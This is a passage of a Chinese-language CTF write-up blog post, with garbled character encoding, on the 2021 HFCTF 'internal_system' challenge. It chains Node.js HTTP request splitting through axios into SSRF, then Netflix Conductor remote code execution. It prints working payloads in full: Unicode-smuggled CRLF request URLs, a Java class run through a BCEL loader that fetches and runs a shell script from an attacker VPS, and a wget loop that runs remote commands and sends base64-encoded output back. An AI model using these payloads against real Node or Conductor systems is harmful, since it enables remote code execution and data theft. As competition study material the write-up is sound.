8.14.0-alpineï¼Œç„¶è€Œå‘ç°æŠ¥é”™ <code>TypeError: Request path contains unescaped characters</code>ï¼Œçœ‹æ¥è²Œä¼¼ä¿®äº†</em></p><pre class="language-bash" data-language="bash"><code class="language-bash">docker pull node:8.13.0-alpinedocker run -itd --name node8.13-test node:8.13.0-alpinedocker <span class="token builtin class-name">exec</span> -it node8.13-test /bin/sh<span class="token comment"># è¿›å…¥dockeré‡Œæ‰§è¡Œ</span><span class="token function">npm</span> i axiosnode</code></pre><p>ç„¶åç»™è‡ªå·±æœåŠ¡å™¨æ‰“æ‰“è¯•è¯•ï¼ŒæœåŠ¡å™¨ä¸Šèµ·ä¸ªæœåŠ¡ç›‘å¬ç«¯å£ã€‚</p><p>Node é‡Œæ‰§è¡Œ</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'axios'</span><span class="token punctuation">)</span><span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">'http://VPSIP/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'</span>axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>error<span class="token punctuation">)</span></code></pre><p>å¯ä»¥çœ‹åˆ°è¯·æ±‚æˆåŠŸæ¢è¡Œäº†ï¼Œè€Œä¸”å¤¹å¸¦äº†ä¸€ä¸ªæ–°çš„è¯·æ±‚ã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405172556293.png"></p><p>å†å¤¹å¸¦ä¸€ä¸ª POST è¯·æ±‚è¯•è¯•</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">'http://VPSIP/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://10.0.66.14:8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:15\u{010D}\u{010A}\u{010D}\u{010A}MiaoTony Meow~~\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'</span></code></pre><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405173244232.png"></p><p>å¥½è€¶ï¼ŒPOST è¯·æ±‚æ„é€ æˆåŠŸäº†ï¼</p><br><hr><h3 id="Step-06-å€ŸåŠ©-SSRF-æ‰“-Conductor-RCE"><a href="#Step-06-å€ŸåŠ©-SSRF-æ‰“-Conductor-RCE" class="headerlink" title="Step 06 å€ŸåŠ© SSRF æ‰“ Conductor RCE"></a>Step 06 å€ŸåŠ© SSRF æ‰“ Conductor RCE</h3><p>é‚£å†å›æ¥çœ‹ Conductor RCEã€‚</p><p>ç›´æ¥æ”¹ èµµæ€»çš„ Exploit å¥½äº†ã€‚</p><p>è¿™é‡Œå…¶å®è¯•äº†æ— æ•°æ¬¡ï¼Œå‘ç°éƒ½åå¼¹ä¸äº† shellï¼Œä¼°è®¡æ˜¯æ²¡æœ‰ bashï¼Œä½†ç”šè‡³ç›´æ¥ <code>cat /flag &gt; /dev/tcp/IP/PORT</code> ä¹Ÿå‡ºä¸æ¥ï¼Œä¸æ‡‚ä¸ºå•¥ã€‚ã€‚ï¼ˆéš¾é“é‡å®šå‘ä¸è¡Œï¼Ÿ</p><p>ï¼ˆå¿ƒæ€ç‚¸äº†ï¼ï¼ï¼å•Šå•Šå•Šå•Šå•Šå•Šå•Šï¼</p><p>æœ€åæ²¡åŠæ³•ï¼Œè¿˜æ˜¯å…ˆæŠŠ shell è„šæœ¬å†™å…¥æ–‡ä»¶ï¼Œå† <code>sh filename</code> æ‰§è¡Œä»£ç ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿ä¿®æ”¹å‘½ä»¤ï¼Œå°±åœ¨ VPS ä¸Šæ”¾è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œé¶æœºä¸Šçš„ shell é‡Œåˆ©ç”¨ wget ä¸‹æ¥åæ‰§è¡Œå‘½ä»¤ï¼Œå†åˆ©ç”¨ URL ä¼ å‚æŠŠæ‰§è¡Œç»“æœè¿”å›ç»™ VPSã€‚</p><p><code>Evil.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"wget http://VPSIP:PORT/ -O /tmp/miaotony"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ç„¶åç¼–è¯‘å¾—åˆ°ä¸€ä¸ª <code>Evil.class</code>ï¼Œå†åˆ©ç”¨ <a href="https://github.com/f1tz/BCELCodeman">BCELCodeman</a> è½¬æ¢ä¸º BCEL ç¼–ç ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">javac Evil.javajava -jar BCELCodeman.jar e Evil.class</code></pre><p>ï¼ˆå–µå–µè¿™é‡Œç”¨çš„ java ç‰ˆæœ¬æ˜¯ </p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># javac -version</span>javac <span class="token number">1.8</span>.0_221<span class="token comment"># java -version  </span>java version <span class="token string">"1.8.0_221"</span>Java<span class="token punctuation">(</span>TM<span class="token punctuation">)</span> SE Runtime Environment <span class="token punctuation">(</span>build <span class="token number">1.8</span>.0_221-b11<span class="token punctuation">)</span>Java HotSpot<span class="token punctuation">(</span>TM<span class="token punctuation">)</span> <span class="token number">64</span>-Bit Server VM <span class="token punctuation">(</span>build <span class="token number">25.221</span>-b11, mixed mode<span class="token punctuation">)</span></code></pre><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405220520308.png"></p><p>ç»„åˆåˆ° JSON é‡Œ</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5......').newInstance().class}"</span><span class="token punctuation">,</span><span class="token property">"ownerEmail"</span><span class="token operator">:</span><span class="token string">"test@example.org"</span><span class="token punctuation">,</span><span class="token property">"retryCount"</span><span class="token operator">:</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token property">"timeoutSeconds"</span><span class="token operator">:</span><span class="token string">"1200"</span><span class="token punctuation">,</span><span class="token property">"inputKeys"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"sourceRequestId"</span><span class="token punctuation">,</span><span class="token string">"qcElementType"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"outputKeys"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"state"</span><span class="token punctuation">,</span><span class="token string">"skipped"</span><span class="token punctuation">,</span><span class="token string">"result"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"timeoutPolicy"</span><span class="token operator">:</span><span class="token string">"TIME_OUT_WF"</span><span class="token punctuation">,</span><span class="token property">"retryLogic"</span><span class="token operator">:</span><span class="token string">"FIXED"</span><span class="token punctuation">,</span><span class="token property">"retryDelaySeconds"</span><span class="token operator">:</span><span class="token string">"600"</span><span class="token punctuation">,</span><span class="token property">"responseTimeoutSeconds"</span><span class="token operator">:</span><span class="token string">"3600"</span><span class="token punctuation">,</span><span class="token property">"concurrentExecLimit"</span><span class="token operator">:</span><span class="token string">"100"</span><span class="token punctuation">,</span><span class="token property">"rateLimitFrequencyInSeconds"</span><span class="token operator">:</span><span class="token string">"60"</span><span class="token punctuation">,</span><span class="token property">"rateLimitPerFrequency"</span><span class="token operator">:</span><span class="token string">"50"</span><span class="token punctuation">,</span><span class="token property">"isolationgroupId"</span><span class="token operator">:</span><span class="token string">"myIsolationGroupId"</span><span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><p>æœ€åæ„é€  POST è¯·æ±‚ã€‚</p><pre class="language-none"><code class="language-none">POST /api/metadata/taskdefs? HTTP/1.1Host: 10.0.64.14:8080Content-Type: application/jsonContent-Length:1408[{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5......').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]</code></pre><p>å† URL ç¼–ç ä¸€ä¸‹ï¼Œè¿˜éœ€è¦å€ŸåŠ© <code>/proxy</code> æ¥å£ SSRF ä»£ç†è¯·æ±‚ã€‚</p><p>å‚è€ƒä¸€ä¸‹èµµæ€»çš„ JS è„šæœ¬ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">post_payload <span class="token operator">=</span> <span class="token string">'[\u{017b}\u{0122}name\u{0122}:\u{0122}$\u{017b}\u{0127}1\u{0127}.getClass().forName(\u{0127}com.sun.org.apache.bcel.internal.util.ClassLoader\u{0127}).newInstance().loadClass(\u{0127}$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$b3$adn$bbZm$d1R$9f$c5$83$ov$e3$p$aa$88$X$e1$a9$3e$a2$N$P$5el$d7$a4$a6$da$edfM$R$7f$c8$b3$X$c4$83$l$e0G$e1$c......\u{0127}).newInstance().class\u{017d}\u{0122},\u{0122}ownerEmail\u{0122}:\u{0122}test@example.org\u{0122},\u{0122}retryCount\u{0122}:\u{0122}3\u{0122},\u{0122}timeoutSeconds\u{0122}:\u{0122}1200\u{0122},\u{0122}inputKeys\u{0122}:[\u{0122}sourceRequestId\u{0122},\u{0122}qcElementType\u{0122}],\u{0122}outputKeys\u{0122}:[\u{0122}state\u{0122},\u{0122}skipped\u{0122},\u{0122}result\u{0122}],\u{0122}timeoutPolicy\u{0122}:\u{0122}TIME_OUT_WF\u{0122},\u{0122}retryLogic\u{0122}:\u{0122}FIXED\u{0122},\u{0122}retryDelaySeconds\u{0122}:\u{0122}600\u{0122},\u{0122}responseTimeoutSeconds\u{0122}:\u{0122}3600\u{0122},\u{0122}concurrentExecLimit\u{0122}:\u{0122}100\u{0122},\u{0122}rateLimitFrequencyInSeconds\u{0122}:\u{0122}60\u{0122},\u{0122}rateLimitPerFrequency\u{0122}:\u{0122}50\u{0122},\u{0122}isolationgroupId\u{0122}:\u{0122}myIsolationGroupId\u{0122}\u{017d}]'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">encodeURI</span><span class="token punctuation">(</span><span class="token function">encodeURI</span><span class="token punctuation">(</span><span class="token function">encodeURI</span><span class="token punctuation">(</span><span class="token string">'http://0.0.0.0:3000/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://10.0.64.14:8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:'</span> <span class="token operator">+</span> post_payload<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token string">'\u{010D}\u{010A}\u{010D}\u{010A}'</span> <span class="token operator">+</span> post_payload <span class="token operator">+</span> <span class="token string">'\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ‰“çš„æ—¶å€™è®°å¾—æ”¹ä¸€ä¸‹ <code>$$BCEL$$</code> é‚£éƒ¨åˆ†ï¼Œä»¥åŠ conductor é‚£å°é¶æœºçš„ IPã€‚</p><p>å¾—åˆ° </p><pre class="language-none"><code class="language-none">http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.64.14:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1536%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5dO$gA$U$3d$b3$m$L$db$a5$7cXh$b1$l$82$3e$I$9a$b2$rAi$d1$f8$d2$d0$tZ$8c$Q$7d$f0$c5a$9d$d0$b1$ecG$d6$c1$da_$d4g_$b4$f1$c1$l$e0$8f$b2$bd$b31$d2$a4$9dd$ce$cc$3d$f7$cc$b9wf$ee$eeon$B$b4$b1j$n$8dg$WJ$u$a7$f1$5c$af$_LT$y$y$60$c9$c4K$T$af$YR$3b$d2$97j$97$nQo$i0$q$3f$G$t$82$n$d7$97$be$f82$f3$c6$o$g$f1$f1$94$98$ecPq$f7$dbg$k$c6q$7c$baBr$8fK$9f$a1$5c$3f$ea$9f$f2s$eeL$b9$3fq$86$w$92$fed$5b$dbY$c3$60$W$b9$e2$93$d4$W$99$de$b9$9c6$b5$ceF$G$96$89$d76$de$60$99$c1$f9$3e$R$aa$faU$a9$b0$eb8$edN$f3$c3V$b3$b5$d5n$b66$db$ddN$eb$fd$bb$ea$dbA$d5Q$5e$e8x$92$H$w$f0$7f$d8$a8$a2$c6$b08$_$d9$bbpE$a8d$e0$dbX$81E$7d$e9R$M$f9$b9b0$3e$V$aeb$u$cc$a9$fd$99$af$a4G$8dYT$fe1$u$d5$h$fd$7f4$dbd$v$$$84$cb$b0V$ff$cfM$ff$a2$f6$a2$c0$Vggt$m$XRR$c5$cf6$8a$b8$xP$83I$df$a1$87$B$a6_$80$f0$JE$c7$U$h$b4$96$d7$af$c1$7e$c1$u$s$ae$90$3c$fc$89t$7f$e3$K$a9KR$r$91E$9e$7e$cd$80M$ba$r$a4$I$T$c4$$$Q$9f$a1$8c$89$C9$97$c81K$99$3c$8c$df$E$cc$c4S$N$b9d$ac$v$3cT$ab$d0dz$5e$c6$hm$98$8a$89$ya1nn$f1$P$LRz$KA$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private</code></pre><p>ç„¶ååœ¨è‡ªå·± VPS ä¸Šèµ·ä¸€ä¸ª web æœåŠ¡ï¼Œè®¿é—® <code>http://VPSIP:PORT/</code> çš„æ—¶å€™è¿”å›ä¸€ä¸ª shell è„šæœ¬ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">wget</span> -O- -q  http://VPSIP:PORT/<span class="token variable"><span class="token variable">`</span><span class="token function">wget</span> -O- -q http://VPSIP:PORT/command<span class="token operator">|</span><span class="token function">sh</span><span class="token operator">|</span>base64<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{printf("%s",<span class="token variable">$0</span>)}'</span><span class="token variable">`</span></span> <span class="token operator">|</span> <span class="token builtin class-name">echo</span></code></pre><p>åŒæ—¶åœ¨ç›‘å¬ <code>http://VPSIP:PORT/command</code> çš„åœ°æ–¹æ”¾ä½ è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ¯”å¦‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> /flag</code></pre><p>è¿™é‡Œæ‰§è¡Œçš„æ—¶å€™ä¼šè®¿é—® <code>http://VPSIP:PORT/command</code>ï¼Œæ‰§è¡Œè¿™æ¡å‘½ä»¤ï¼Œå†è¿›è¡Œ base64 ç¼–ç ï¼Œæœ€åæŠŠæ¢è¡Œç»™å»æ‰ã€‚æœ€åæŠŠæ‰§è¡Œçš„ç»“æœè¿”å›åˆ° <code>http://VPSIP:PORT/xxx</code> è¿™ä¸ªè·¯ç”±ä¸‹ï¼Œæ ¹æ®æœåŠ¡å™¨çš„æ—¥å¿—ï¼ŒæŠŠ path base64 è§£ç ä¸€ä¸‹å°±èƒ½æ‹¿åˆ°æ‰§è¡Œçš„ç»“æœäº†ã€‚</p><p>å¦‚æœä¸å»æ‰æ¢è¡Œçš„è¯ base64 å¤šè¡Œçš„è¯ä¼šä¸¢ä¿¡æ¯ï¼Œæ‰§è¡Œè¿˜ä¼šè®¤ä¸ºæ˜¯å¤šä¸ª wget å‘½ä»¤äºæ˜¯æŠ¥é”™ã€‚ã€‚</p><hr><p>å†æŒ‰ç…§è¿™ä¸€æ­¥çš„æ€è·¯ï¼ŒåŒç†ç”Ÿæˆä¸€ä¸ª æ‰§è¡Œ <code>/tmp/miaotony</code> çš„ URLã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"sh /tmp/miaotony"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// &lt;========</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>BCEL: </p><pre class="language-none"><code class="language-none">$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$EDP$f0$85$ba$Q4$b1$hw$g7FW$f8$88$Y$5d$b8q$a8$T$i$a5$z$v$D$d1$_r$cdF$8d$L$3f$c0$8fR$ef4FLt$9293$f7$dcs$cf$9d$c7$fb$c7$eb$h$80$z$ac$daHc$daF$J$e54f$f4$3ak$a1b$p$89$aa$859$L$f3$M$a9$j$ZH$b5$cb$90$a87$ce$Z$cc$bd$f0Z0$e4$9a2$QG$D$bf$z$a23$de$ee$S$93m$v$ee$dd$j$f2$5e$i$c7$d5$V$92$fb$5c$G$M$e5$fae$f3$96$P$b9$db$e5A$c7m$a9H$G$9dmmg$b7$c2A$e4$89$D$a9$z2$fbC$d9$dd$d4$3a$H$Z$d8$W$W$i$yb$89$n$df$bf$a9$b9$ca$ef$b9$be$e4$a1$K$83$H$H5$y3$U$c7$9e$fb$f7$9e$e8$v$Z$G$OV$60Sc$edE$95c$c5q$fbVx$8a$a10$a6N$H$81$92$3eu$b6$3bB$fd$E$a5z$a3$f9G$b3M$96$e2$5ex$Mk$f5$7f$ae$f2$8b$3a$89BO$f4$fbT$90$ebQR$c5$efr$WqO$60$Z$W$bd$b7$k$G$98$be$o$e1$EEW$U$h$b4$96$d7$9f$c1$5e$60L$r$9e$60$5e$3c$o$dd$dcxBjD$w$TY$e4$e9$5b$M8$a4$ab$oE$98$m6I$7c$862$W$K$e4$5c$o$c7$ye$f20$3e$J$98$85I$N93$d6$U$be$bbUh2$3dG$f1F$h$a6b$oK8$V$l$ae$f8$F$bat$9bh$o$C$A$A</code></pre><p>URL:</p><pre class="language-none"><code class="language-none">http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.64.14:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1408%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$EDP$f0$85$ba$Q4$b1$hw$g7FW$f8$88$Y$5d$b8q$a8$T$i$a5$z$v$D$d1$_r$cdF$8d$L$3f$c0$8fR$ef4FLt$9293$f7$dcs$cf$9d$c7$fb$c7$eb$h$80$z$ac$daHc$daF$J$e54f$f4$3ak$a1b$p$89$aa$859$L$f3$M$a9$j$ZH$b5$cb$90$a87$ce$Z$cc$bd$f0Z0$e4$9a2$QG$D$bf$z$a23$de$ee$S$93m$v$ee$dd$j$f2$5e$i$c7$d5$V$92$fb$5c$G$M$e5$fae$f3$96$P$b9$db$e5A$c7m$a9H$G$9dmmg$b7$c2A$e4$89$D$a9$z2$fbC$d9$dd$d4$3a$H$Z$d8$W$W$i$yb$89$n$df$bf$a9$b9$ca$ef$b9$be$e4$a1$K$83$H$H5$y3$U$c7$9e$fb$f7$9e$e8$v$Z$G$OV$60Sc$edE$95c$c5q$fbVx$8a$a10$a6N$H$81$92$3eu$b6$3bB$fd$E$a5z$a3$f9G$b3M$96$e2$5ex$Mk$f5$7f$ae$f2$8b$3a$89BO$f4$fbT$90$ebQR$c5$efr$WqO$60$Z$W$bd$b7$k$G$98$be$o$e1$EEW$U$h$b4$96$d7$9f$c1$5e$60L$r$9e$60$5e$3c$o$dd$dcxBjD$w$TY$e4$e9$5b$M8$a4$ab$oE$98$m6I$7c$862$W$K$e4$5c$o$c7$ye$f20$3e$J$98$85I$N93$d6$U$be$bbUh2$3dG$f1F$h$a6b$oK8$V$l$ae$f8$F$bat$9bh$o$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private</code></pre><h3 id="Step-07-å¼€æ‰“æ‹¿-flag"><a href="#Step-07-å¼€æ‰“æ‹¿-flag" class="headerlink" title="Step 07 å¼€æ‰“æ‹¿ flag"></a>Step 07 å¼€æ‰“æ‹¿ flag</h3><p>é¦–å…ˆå…ˆè¯•è¯•æ‰“åˆ°è‡ªå·± VPSï¼Œç›‘å¬ä¸€ä¸‹ç«¯å£çœ‹çœ‹å‘ç»™ conductor é¶æœºçš„è¯·æ±‚é•¿ä»€ä¹ˆæ ·ã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405222043905.png"></p><p>å¾ˆå¥½ï¼ŒPOST è¯·æ±‚æ„é€ å¾—å¾ˆå¥½ã€‚</p><p>ç„¶å <strong>æ‰“ç»™é¶æœº</strong>ã€‚</p><p>ä¾æ¬¡æ‰§è¡Œ Step 06 ä¸­ç”Ÿæˆçš„ä¸¤ä¸ª URLï¼Œåˆ©ç”¨ SSRF æ‰“åˆ° Conductor ä¸Šã€‚</p><p><img src="/2021/04/05/CTF_2021HFCTF_internal_system/image-20210405224546302.png"></p><p>æœ€åæ‰§è¡Œå†™å…¥ <code>/tmp/miaotony</code> 